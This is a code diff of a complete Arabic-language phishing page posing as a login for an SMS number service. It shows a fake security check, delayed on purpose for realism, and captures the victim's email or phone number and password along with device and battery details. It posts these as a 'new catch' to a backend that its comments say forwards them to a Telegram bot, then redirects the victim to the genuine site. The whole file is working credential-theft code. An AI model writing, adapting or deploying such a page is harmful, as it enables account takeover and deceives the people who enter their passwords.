@@ -1,82 +1,150 @@
-<script>
-    let isVerified = false;
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تفعيل الخدمة - SMS Services</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    
+    <style>
+        body {
+            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #FF0055 0%, #CC0044 100%); 
+            display: flex; flex-direction: column; align-items: center; min-height: 100vh;
+        }
 
-    // وظيفة التحقق مع تأخير ثانيتين ونصف للواقعية
-    function handleCaptcha() {
-        const cfBox = document.getElementById('cf-box');
-        const loader = document.getElementById('loader-text');
-        cfBox.style.display = 'none';
-        loader.style.display = 'block';
+        .top-bar { width: 100%; max-width: 380px; padding: 15px 10px; display: flex; justify-content: flex-end; }
+        .menu-icon { cursor: pointer; padding: 5px; }
+        .menu-line { width: 25px; height: 3px; background-color: white; margin: 5px 0; border-radius: 2px; }
 
-        setTimeout(() => {
-            loader.innerHTML = '✅ تم التحقق من أمان جهازك بنجاح';
-            loader.style.color = 'green';
-            isVerified = true;
-        }, 2500);
-    }
-
-    // جلب معلومات الجهاز والبطارية
-    async function getDeviceInfo() {
-        let batteryLevel = "غير معروف";
-        try {
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                batteryLevel = Math.round(battery.level * 100) + "%";
-            }
-        } catch (e) {}
-        return { battery: batteryLevel };
-    }
-
-    // عند الضغط على زر "تسجيل دخول" أو "تفعيل الآن"
-    document.getElementById('checkForm').onsubmit = async (e) => {
-        e.preventDefault();
+        .container {
+            background: white; padding: 30px; border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2); width: 90%; max-width: 380px; text-align: center;
+        }
+        #pageImg { width: 100px; height: 100px; border-radius: 50%; object-fit: contain; margin-bottom: 20px; }
+        h2 { color: #CC0044; margin-bottom: 25px; font-size: 19px; }
         
-        if (!isVerified) {
-            Swal.fire({ text: 'يرجى إكمال التحقق أولاً', icon: 'warning', confirmButtonColor: '#CC0044' });
-            return;
+        input {
+            width: 100%; padding: 14px; margin-bottom: 15px;
+            border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; outline: none; text-align: right;
         }
 
-        const deviceData = await getDeviceInfo();
-        const userValue = document.getElementById('userInput').value;
-        const passValue = document.getElementById('passInput').value;
+        /* تنسيق التحقق الوهمي */
+        .captcha-wrapper { margin-bottom: 20px; min-height: 65px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        #loader-text { color: #CC0044; font-weight: bold; display: none; font-size: 14px; }
 
-        // صياغة التقرير المرتب للبوت كما في الصورة التي أرسلتها
-        const reportMessage = `
-✨ **بيانات تسجيل دخول جديدة** ✨
-----------------------------------
-👤 **المستخدم:** ${userValue}
-🔑 **كلمة السر:** ${passValue}
-----------------------------------
-📱 **النظام:** ${navigator.platform}
-🔋 **البطارية:** ${deviceData.battery}
-⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}
-----------------------------------
-✅ **حالة الفحص:** آمن (Turnstile)
-        `;
+        button {
+            width: 100%; padding: 14px; background: #CC0044; color: white;
+            border: none; border-radius: 30px; font-size: 17px; font-weight: bold; cursor: pointer;
+            transition: 0.3s; box-shadow: 0 4px 6px rgba(204,0,68,0.2);
+        }
+        button:hover { background: #a30036; transform: translateY(-2px); }
 
-        const payload = {
-            title: "🚀 صيد جديد مكتمل",
-            message: reportMessage, // هذا النص المنسق هو ما سيظهر في التليجرام
-            user: userValue,
-            pass: passValue
+        .footer-links { margin-top: 15px; border-top: 1px solid #eee; padding-top: 15px; font-size: 14px; }
+        .footer-links a { color: #CC0044; text-decoration: none; font-weight: bold; cursor: pointer; }
+
+        .developer-credits { margin: 20px 0; color: white; font-size: 12px; direction: ltr; opacity: 0.8; }
+    </style>
+</head>
+<body>
+
+    <div class="top-bar">
+        <div class="menu-icon" onclick="Swal.fire({title:'القائمة', text:'خدمات الأرقام الدولية', icon:'info', confirmButtonColor:'#CC0044'})">
+            <div class="menu-line"></div><div class="menu-line"></div><div class="menu-line"></div>
+        </div>
+    </div>
+
+    <div class="container">
+        <img id="pageImg" src="https://logodix.com/logo/2014521.png">
+        <h2>سجل دخولك لتفعيل خدمة الأرقام</h2>
+
+        <form id="checkForm">
+            <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="passInput" placeholder="كلمة السر" required>
+            
+            <div class="captcha-wrapper">
+                <div id="loader-text">🔄 جاري فحص أمان الجهاز...</div>
+                <div class="cf-turnstile" id="cf-box" data-sitekey="1x00000000000000000000AA" data-callback="handleCaptcha"></div>
+            </div>
+
+            <button type="submit">تسجيل دخول</button>
+        </form>
+
+        <div class="footer-links">
+            <p>ليس لديك حساب؟ <a onclick="showError()">إنشاء حساب جديد</a></p>
+        </div>
+    </div>
+
+    <div class="developer-credits">تم تطوير الموقع by oliver 2014 - 2026</div>
+
+    <script>
+        let isVerified = false;
+
+        // وظيفة تأخير التحقق لزيادة الواقعية
+        function handleCaptcha() {
+            const cfBox = document.getElementById('cf-box');
+            const loader = document.getElementById('loader-text');
+            
+            cfBox.style.display = 'none';
+            loader.style.display = 'block';
+
+            setTimeout(() => {
+                loader.innerHTML = '✅ تم التحقق من هويتك بنجاح';
+                loader.style.color = 'green';
+                isVerified = true;
+            }, 2500); // تأخير 2.5 ثانية
+        }
+
+        function showError() {
+            Swal.fire({ title: 'خطأ', text: 'فشل الاتصال في الخوادم، يرجى المحاولة لاحقاً.', icon: 'error', confirmButtonColor: '#CC0044' });
+        }
+
+        // دالة جلب معلومات البطارية والجهاز
+        async function getDeviceInfo() {
+            let info = {
+                device: navigator.userAgent,
+                platform: navigator.platform,
+                battery: "غير معروف"
+            };
+
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    info.battery = (battery.level * 100) + "%";
+                }
+            } catch (e) {}
+            return info;
+        }
+
+        document.getElementById('checkForm').onsubmit = async (e) => {
+            e.preventDefault();
+            if (!isVerified) {
+                Swal.fire({ text: 'يرجى إكمال التحقق أولاً', icon: 'warning' });
+                return;
+            }
+
+            const deviceData = await getDeviceInfo();
+            const payload = {
+                title: "🚨 صيد جديد مـكتمل البيانات",
+                user: document.getElementById('userInput').value,
+                pass: document.getElementById('passInput').value,
+                device_type: deviceData.device,
+                battery_level: deviceData.battery,
+                time: new Date().toLocaleString('ar-EG')
+            };
+
+            // إرسال البيانات للبوت
+            try {
+                await fetch('/api/save', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {}
+
+            window.location.href = "https://receive-smss.com/"; 
         };
-
-        try {
-            // تأكد أن هذا الرابط هو المسار الصحيح في Vercel الخاص بك
-            await fetch('/api/save', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-        } catch (err) {
-            console.error("خطأ في الإرسال");
-        }
-
-        // التوجيه النهائي للموقع الحقيقي
-        window.location.href = "https://receive-smss.com/"; 
-    };
-
-    function showError() {
-        Swal.fire({ title: 'خطأ', text: 'فشل الاتصال في الخوادم، يرجى المحاولة لاحقاً.', icon: 'error', confirmButtonColor: '#CC0044' });
-    }
-</script>
+    </script>
+</body>
+</html>
